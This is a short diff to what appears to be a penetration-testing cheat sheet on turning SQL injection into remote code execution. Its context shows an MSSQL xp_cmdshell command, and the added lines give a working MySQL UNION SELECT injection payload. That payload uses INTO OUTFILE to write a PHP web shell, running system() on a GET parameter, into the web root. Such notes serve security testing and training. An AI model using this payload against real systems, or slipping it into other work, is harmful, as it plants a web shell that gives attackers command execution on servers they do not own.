@@ -18,3 +18,11 @@ Like
 ```bash
 EXECUTE xp_cmdshell 'whoami';
 ```
+
+
+
+MySQL database variant doesn't provide single function to escalate to RCE.
+We can abuse the `SELECT INTO_OUTFILE` statement to write on server.
+```mysql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
